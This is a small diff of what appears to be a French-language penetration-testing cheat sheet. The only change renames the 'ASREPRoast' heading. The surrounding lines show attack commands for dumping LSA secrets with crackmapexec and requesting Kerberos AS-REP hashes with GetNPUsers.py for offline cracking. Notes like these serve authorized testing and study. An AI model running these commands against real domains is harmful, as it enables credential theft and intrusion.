@@ -89,7 +89,7 @@ Télécharger shell.ps1
 crackmapexec smb 192.168.1.105 -u '[user]' -p '[password]' --lsa
 
 ## Attaque sur Kerberos:
-### ASREPRoast:
+### ASREPRoast (AS-REP Roasting):
 ASREPRoast est une technique qui permet de récupérer le mot de passe Kerberos d'un utilisateur en brutforcant son TGT lorsque que la pré-authentification est désactivé  
 récupération du hash d'un compte:  
 GetNPUsers.py [domaine]/[user] -request -no-pass -dc-ip [IP]  
